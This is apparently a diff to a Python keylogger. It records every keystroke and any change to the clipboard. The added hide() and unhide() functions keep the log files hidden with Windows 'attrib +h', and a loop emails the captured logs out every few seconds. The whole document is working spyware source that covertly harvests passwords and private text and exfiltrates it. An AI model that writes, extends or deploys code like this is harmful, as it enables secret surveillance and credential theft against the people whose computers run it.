@@ -9,19 +9,36 @@ import ctypes
 from emailFunctionality import sendEmail
 from encryption import encryptContents 
 
+ThreadRunning = True
+
+
 log_file = "logs.txt"
 clipBoard_file = "clipBoardLogs.txt"
+
+
+
+
+def unhide():
+    if os.path.exists(log_file):
+        os.system(f'attrib -h "{log_file}"')
+
+    if os.path.exists(clipBoard_file):
+        os.system(f'attrib -h "{clipBoard_file}"')
+
+def hide():
+    if os.path.exists(log_file):
+        os.system(f'attrib +h "{log_file}"')
+
+    if os.path.exists(clipBoard_file):
+        os.system(f'attrib +h "{clipBoard_file}"')
+
+unhide()
 with open(log_file, "w") and open(clipBoard_file, "w"):
     pass
 
-import os
-
-os.system(f'attrib +h "{log_file}"')
-os.system(f'attrib +h "{clipBoard_file}"')
+hide()
 
 
-
-ThreadRunning = True
 def on_press(key):
     global ThreadRunning
     if key == keyboard.Key.esc:
@@ -30,8 +47,10 @@ def on_press(key):
         return False  
     
     keyPressed = returnKeyType(key)
+    unhide()
     with open(log_file, "a") as keyLogs:
         keyLogs.write(parseOutput(keyPressed))
+    hide()
 
 def returnKeyType(key):
     try:
@@ -54,37 +73,26 @@ def checkClipBoard():
         currContent = pyperclip.paste()
         if currContent != prevContent:
             prevContent = currContent
+            unhide()
+
             with open(clipBoard_file, "a") as clipBoardKeyLogs:
                 clipBoardKeyLogs.write(parseOutput(prevContent))
 
+            hide()
         time.sleep(1)
     
 
 def sendToEmail():
 
     while ThreadRunning:
-        
-        # if os.path.exists("logs.txt"):
-        #     ctypes.windll.kernel32.SetFileAttributesW("logs.txt", 0x02)
-        # if os.path.exists("clipBoardLogs.txt"):
-        #     ctypes.windll.kernel32.SetFileAttributesW("clipBoardLogs.txt", 0x02)
-        # if os.path.exists("logs.txt"):
-        #     ctypes.windll.kernel32.SetFileAttributesW("logs.txt", 0x80)  # Remove hidden attribute
-        # if os.path.exists("clipBoardLogs.txt"):
-        #     ctypes.windll.kernel32.SetFileAttributesW("clipBoardLogs.txt", 0x80)  # Remove hidden attribute
-
-        # # Encrypt contents
-        # log_file = encryptContents("logs.txt")
-        # clipBoard_file = encryptContents("clipBoardLogs.txt")
-
-        # # Re-hide the files after encryption
-        # if log_file and os.path.exists(log_file):
-        #     ctypes.windll.kernel32.SetFileAttributesW(log_file, 0x02)
-        # if clipBoard_file and os.path.exists(clipBoard_file):
-        #     ctypes.windll.kernel32.SetFileAttributesW(clipBoard_file, 0x02)
+        unhide()
         sendEmail()
-        time.sleep(5)
+        hide()
+        time.sleep(4)
+
     return
+
+
 
 
 if __name__ == "__main__":
@@ -100,17 +108,20 @@ if __name__ == "__main__":
 
         listener.start() 
         listener.join()
+
         if os.path.exists("logs.txt"):
+            os.system(f'attrib -h "{"logs.txt"}"')
             os.remove("logs.txt")
         if os.path.exists("clipBoardLogs.txt"):
+            os.system(f'attrib -h "{"clipBoardLogs.txt"}"')
             os.remove("clipBoardLogs.txt")
         if os.path.exists("logs.bin"):
+            os.system(f'attrib -h "{"logs.bin"}"')
             os.remove("logs.bin")
         if os.path.exists("clipBoardLogs.bin"):
+            os.system(f'attrib -h "{"clipBoardLogs.bin"}"')
             os.remove("clipBoardLogs.bin")
   
     except KeyboardInterrupt:
         ThreadRunning = False
         
-
-
